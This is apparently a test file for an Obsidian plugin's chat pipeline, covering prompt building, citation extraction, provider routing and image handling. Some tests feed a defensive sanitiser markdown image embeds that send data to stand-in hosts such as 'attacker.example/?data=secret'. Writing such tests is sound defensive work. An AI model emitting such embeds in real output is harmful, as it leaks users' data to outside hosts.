import { beforeEach, describe, expect, test } from "bun:test";
import "./obsidian-mock";
import { createFakeApp } from "./fake-vault";
import {
	requestUrlCalls,
	resetObsidianMock,
	setRequestUrlHandler,
} from "./obsidian-mock";

const { buildSystemPrompt, neutralizeRemoteImageMarkdown, runPipeline } =
	await import("../src/chat/pipeline");
const { VaultIndex } = await import("../src/index/vault-index");
const { DEFAULT_SETTINGS } = await import("../src/settings");
const { NIM_BASE_URL } = await import("../src/providers/openai-compatible");

beforeEach(() => {
	resetObsidianMock();
});

function cloneSettings() {
	return structuredClone(DEFAULT_SETTINGS);
}

// Keyword-only settings for the VaultIndex under test, so retrieve() never
// attempts a network embedding call here (embedding behavior is covered by
// vault-index.test.ts / embedding-store.test.ts / hybrid.test.ts).
function indexSettings() {
	const settings = cloneSettings();
	settings.useEmbeddings = false;
	return settings;
}

describe("buildSystemPrompt", () => {
	test("labels retrieved chunks with a numeric source ID and includes their text", () => {
		const { prompt, sources } = buildSystemPrompt([
			{
				id: "a#0",
				path: "01 Projects/rocket.md",
				heading: "Fuel",
				text: "Liquid fuel is dense.",
			},
		]);

		expect(prompt).toContain("[1] 01 Projects/rocket.md");
		expect(prompt).toContain("Fuel");
		expect(prompt).toContain("Liquid fuel is dense.");
		expect(sources.get(1)).toBe("01 Projects/rocket.md");
	});

	test("says plainly when no notes were found", () => {
		const { prompt } = buildSystemPrompt([]);
		expect(prompt).toContain("No relevant notes were found");
	});

	test("does not include the Obsidian capabilities catalog (read-only prompt, no write manual needed)", () => {
		const { prompt } = buildSystemPrompt([]);
		expect(prompt).not.toContain("What Obsidian can render and do");
	});

	test("numbers pinned notes before chunks, continuing the same counter", () => {
		const { sources } = buildSystemPrompt(
			[
				{
					id: "a#0",
					path: "01 Projects/rocket.md",
					heading: "Fuel",
					text: "Liquid fuel is dense.",
				},
			],
			[{ path: "Pinned/attached-note.md", text: "Attached content." }],
		);

		expect(sources.get(1)).toBe("Pinned/attached-note.md");
		expect(sources.get(2)).toBe("01 Projects/rocket.md");
	});

	test("instructs the model to cite only supplied source IDs, and to say when a claim is general knowledge", () => {
		const { prompt } = buildSystemPrompt([]);
		expect(prompt).toContain(
			"For each vault-grounded claim, cite only its supplied source ID as [n].",
		);
		expect(prompt).toContain("Do not cite an ID you did not use.");
		expect(prompt).toContain(
			"If no supplied source supports a claim, say that it is general knowledge.",
		);
	});
});

describe("neutralizeRemoteImageMarkdown", () => {
	test("turns an https image embed into a plain link", () => {
		const input = "See ![leak](https://attacker.example/?data=secret) here.";
		expect(neutralizeRemoteImageMarkdown(input)).toBe(
			"See [leak](https://attacker.example/?data=secret) here.",
		);
	});

	test("turns an http image embed into a plain link", () => {
		expect(
			neutralizeRemoteImageMarkdown("![x](http://evil.example/x.png)"),
		).toBe("[x](http://evil.example/x.png)");
	});

	test("turns a protocol-relative image embed into a plain link", () => {
		expect(neutralizeRemoteImageMarkdown("![x](//evil.example/x.png)")).toBe(
			"[x](//evil.example/x.png)",
		);
	});

	test("leaves local/relative image embeds untouched", () => {
		const input = "![diagram](attachments/diagram.png)";
		expect(neutralizeRemoteImageMarkdown(input)).toBe(input);
	});

	test("leaves data: image embeds untouched", () => {
		const input = "![x](data:image/png;base64,AAAA)";
		expect(neutralizeRemoteImageMarkdown(input)).toBe(input);
	});

	test("leaves plain (non-image) links untouched", () => {
		const input = "[a link](https://example.com)";
		expect(neutralizeRemoteImageMarkdown(input)).toBe(input);
	});

	test("handles multiple remote embeds in the same string", () => {
		const input =
			"![a](https://x.example/a.png) text ![b](https://x.example/b.png)";
		expect(neutralizeRemoteImageMarkdown(input)).toBe(
			"[a](https://x.example/a.png) text [b](https://x.example/b.png)",
		);
	});
});

describe("runPipeline", () => {
	test("retrieves vault chunks, cites only the source IDs the model actually used, and calls the configured provider", async () => {
		const app = createFakeApp([
			{
				path: "01 Projects/rocket.md",
				content:
					"# Rocket engine\nDesigning a liquid-fuel rocket engine for the Mars mission.",
			},
			{
				path: "01 Projects/garden.md",
				content: "# Garden\nTomato planting schedule for spring.",
			},
		]);
		const index = new VaultIndex(app, [], indexSettings());
		await index.build();

		setRequestUrlHandler(() => ({
			json: { content: [{ text: "Here is the answer. [1]" }] },
		}));

		const settings = cloneSettings();
		settings.activeProvider = "anthropic";
		settings.providers.anthropic.apiKey = "sk-ant-test";
		settings.activeModel = "claude-sonnet-4-5";

		const result = await runPipeline("rocket engine fuel", settings, index);

		expect(result.answer).toBe("Here is the answer. [1]");
		expect(result.citations).toEqual(["01 Projects/rocket.md"]);

		// Hit the Anthropic endpoint (provider selection from settings).
		expect(requestUrlCalls[0]?.url).toBe(
			"https://api.anthropic.com/v1/messages",
		);

		// The system prompt sent to the provider carries the retrieved excerpt.
		const body = JSON.parse(requestUrlCalls[0]?.body ?? "{}");
		expect(body.system).toContain("01 Projects/rocket.md");
		expect(body.system).toContain("liquid-fuel rocket engine");
		expect(body.messages).toEqual([
			{ role: "user", content: "rocket engine fuel" },
		]);
	});

	test("selects the NIM OpenAI-compatible provider when configured", async () => {
		const app = createFakeApp([]);
		const index = new VaultIndex(app, [], indexSettings());
		await index.build();

		setRequestUrlHandler(() => ({
			json: { choices: [{ message: { content: "nim answer" } }] },
		}));

		const settings = cloneSettings();
		settings.activeProvider = "nim";
		settings.providers.nim.apiKey = "nvapi-test";
		settings.activeModel = "meta/llama-3.1-8b-instruct";

		const result = await runPipeline("anything", settings, index);

		expect(result.answer).toBe("nim answer");
		expect(result.citations).toEqual([]);
		expect(requestUrlCalls[0]?.url).toBe(`${NIM_BASE_URL}/chat/completions`);
		expect(requestUrlCalls[0]?.headers?.Authorization).toBe(
			"Bearer nvapi-test",
		);
	});

	test("threads user-attached (pinned) notes into the system prompt above retrieved excerpts, and cites them", async () => {
		const app = createFakeApp([
			{
				path: "01 Projects/rocket.md",
				content:
					"# Rocket engine\nDesigning a liquid-fuel rocket engine for the Mars mission.",
			},
			{
				path: "Pinned/attached-note.md",
				content: "This is the attached note's content.",
			},
		]);
		const index = new VaultIndex(app, [], indexSettings());
		await index.build();

		setRequestUrlHandler(() => ({
			json: { content: [{ text: "Here is the answer, see [1] and [2]." }] },
		}));

		const settings = cloneSettings();
		settings.activeProvider = "anthropic";
		settings.providers.anthropic.apiKey = "sk-ant-test";

		const result = await runPipeline("rocket engine fuel", settings, index, {
			pinnedPaths: ["Pinned/attached-note.md"],
			app,
		});

		// Pinned notes are numbered before retrieved chunks (buildSystemPrompt's
		// counter), so [1] is the pinned note and [2] is the retrieved chunk.
		expect(result.citations).toEqual([
			"Pinned/attached-note.md",
			"01 Projects/rocket.md",
		]);

		const body = JSON.parse(requestUrlCalls[0]?.body ?? "{}");
		expect(body.system).toContain("User-attached notes");
		expect(body.system).toContain("Pinned/attached-note.md");
		expect(body.system).toContain("This is the attached note's content.");

		// Attached-notes section appears above the retrieved vault excerpts.
		const attachedIdx = body.system.indexOf("User-attached notes");
		const excerptsIdx = body.system.indexOf("Vault excerpts");
		expect(attachedIdx).toBeGreaterThan(-1);
		expect(excerptsIdx).toBeGreaterThan(attachedIdx);
	});

	test("skips a pinned path that no longer resolves to a readable note, without blocking the send", async () => {
		const app = createFakeApp([
			{ path: "Real/note.md", content: "Real content." },
		]);
		const index = new VaultIndex(app, [], indexSettings());
		await index.build();

		setRequestUrlHandler(() => ({
			json: { content: [{ text: "ok" }] },
		}));

		const settings = cloneSettings();
		settings.activeProvider = "anthropic";
		settings.providers.anthropic.apiKey = "key";

		const result = await runPipeline("anything", settings, index, {
			pinnedPaths: ["Deleted/gone.md"],
			app,
		});

		expect(result.answer).toBe("ok");
		expect(result.citations).not.toContain("Deleted/gone.md");
		const body = JSON.parse(requestUrlCalls[0]?.body ?? "{}");
		expect(body.system).not.toContain("Deleted/gone.md");
	});

	test("truncates a pinned note longer than the per-note cap", async () => {
		const longContent = "x".repeat(5000);
		const app = createFakeApp([
			{ path: "Pinned/long-note.md", content: longContent },
		]);
		const index = new VaultIndex(app, [], indexSettings());
		await index.build();

		setRequestUrlHandler(() => ({
			json: { content: [{ text: "ok" }] },
		}));

		const settings = cloneSettings();
		settings.activeProvider = "anthropic";
		settings.providers.anthropic.apiKey = "key";

		await runPipeline("anything", settings, index, {
			pinnedPaths: ["Pinned/long-note.md"],
			app,
		});

		const body = JSON.parse(requestUrlCalls[0]?.body ?? "{}");
		expect(body.system).not.toContain(longContent);
		expect(body.system).toContain("x".repeat(4000));
		expect(body.system).toContain("[truncated]");
	});

	test("includes prior conversation history between the system prompt and the new query", async () => {
		const app = createFakeApp([]);
		const index = new VaultIndex(app, [], indexSettings());
		await index.build();

		setRequestUrlHandler(() => ({
			json: { content: [{ text: "ok" }] },
		}));

		const settings = cloneSettings();
		settings.activeProvider = "anthropic";
		settings.providers.anthropic.apiKey = "key";

		await runPipeline("follow-up question", settings, index, {
			history: [
				{ role: "user", content: "first question" },
				{ role: "assistant", content: "first answer" },
			],
		});

		const body = JSON.parse(requestUrlCalls[0]?.body ?? "{}");
		expect(body.messages).toEqual([
			{ role: "user", content: "first question" },
			{ role: "assistant", content: "first answer" },
			{ role: "user", content: "follow-up question" },
		]);
	});

	describe("evidence-based citations", () => {
		// Five vault notes that all match the keyword query, so retrieval
		// returns all five chunks and assigns them stable source IDs 1..5
		// (in whatever order VaultIndex.retrieve ranks them).
		async function fiveChunkIndex() {
			const app = createFakeApp([
				{ path: "Notes/one.md", content: "# One\nWidget alpha content." },
				{ path: "Notes/two.md", content: "# Two\nWidget beta content." },
				{ path: "Notes/three.md", content: "# Three\nWidget gamma content." },
				{ path: "Notes/four.md", content: "# Four\nWidget delta content." },
				{ path: "Notes/five.md", content: "# Five\nWidget epsilon content." },
			]);
			const index = new VaultIndex(app, [], indexSettings());
			await index.build();
			const chunks = await index.retrieve("widget", 5);
			const paths = chunks.map((chunk) => chunk.path);
			return { index, paths };
		}

		test("cites only the [n] IDs present in the answer (2 of 5 chunks)", async () => {
			const { index, paths } = await fiveChunkIndex();
			expect(paths).toHaveLength(5);

			setRequestUrlHandler(() => ({
				json: {
					content: [
						{ text: "Per [1], and confirmed again in [3], widgets are great." },
					],
				},
			}));

			const settings = cloneSettings();
			settings.activeProvider = "anthropic";
			settings.providers.anthropic.apiKey = "key";

			const result = await runPipeline("widget", settings, index, { k: 5 });

			expect(result.citations).toEqual([paths[0] ?? "", paths[2] ?? ""]);
		});

		test("returns an empty citations list when the answer cites no IDs (general knowledge)", async () => {
			const { index, paths } = await fiveChunkIndex();
			expect(paths).toHaveLength(5);

			setRequestUrlHandler(() => ({
				json: {
					content: [{ text: "That's general knowledge, not from your vault." }],
				},
			}));

			const settings = cloneSettings();
			settings.activeProvider = "anthropic";
			settings.providers.anthropic.apiKey = "key";

			const result = await runPipeline("widget", settings, index, { k: 5 });

			expect(result.citations).toEqual([]);
		});

		test("ignores an invalid/out-of-range ID while still honoring a valid one", async () => {
			const { index, paths } = await fiveChunkIndex();
			expect(paths).toHaveLength(5);

			setRequestUrlHandler(() => ({
				json: {
					content: [{ text: "See [2] and also [9] (which doesn't exist)." }],
				},
			}));

			const settings = cloneSettings();
			settings.activeProvider = "anthropic";
			settings.providers.anthropic.apiKey = "key";

			const result = await runPipeline("widget", settings, index, { k: 5 });

			expect(result.citations).toEqual([paths[1] ?? ""]);
		});
	});

	describe("images / vision routing", () => {
		test("with images: builds a ContentPart[] user message and routes through the vision task-model pair", async () => {
			const app = createFakeApp([]);
			const index = new VaultIndex(app, [], indexSettings());
			await index.build();

			setRequestUrlHandler(() => ({
				json: { choices: [{ message: { content: "I see a cat." } }] },
			}));

			const settings = cloneSettings();
			settings.activeProvider = "anthropic";
			settings.providers.anthropic.apiKey = "sk-ant-test";
			settings.activeModel = "claude-sonnet-4-5";
			settings.providers.nim.apiKey = "nvapi-test";
			settings.taskModels.vision = {
				providerId: "nim",
				model: "nvidia/nemotron-nano-12b-v2-vl",
			};

			const result = await runPipeline("what is this?", settings, index, {
				images: [{ type: "image", mimeType: "image/png", base64: "QUJD" }],
			});

			expect(result.answer).toBe("I see a cat.");
			expect(requestUrlCalls[0]?.url).toBe(`${NIM_BASE_URL}/chat/completions`);
			const body = JSON.parse(requestUrlCalls[0]?.body ?? "{}");
			expect(body.model).toBe("nvidia/nemotron-nano-12b-v2-vl");
			expect(body.messages[body.messages.length - 1].content).toEqual([
				{ type: "text", text: "what is this?" },
				{
					type: "image_url",
					image_url: { url: "data:image/png;base64,QUJD" },
				},
			]);
		});

		test("without images: plain string content on the active model, unchanged", async () => {
			const app = createFakeApp([]);
			const index = new VaultIndex(app, [], indexSettings());
			await index.build();

			setRequestUrlHandler(() => ({ json: { content: [{ text: "ok" }] } }));

			const settings = cloneSettings();
			settings.activeProvider = "anthropic";
			settings.providers.anthropic.apiKey = "key";
			settings.activeModel = "claude-sonnet-4-5";

			await runPipeline("hello", settings, index);

			const body = JSON.parse(requestUrlCalls[0]?.body ?? "{}");
			expect(body.model).toBe("claude-sonnet-4-5");
			expect(body.messages[body.messages.length - 1].content).toBe("hello");
		});
	});
});
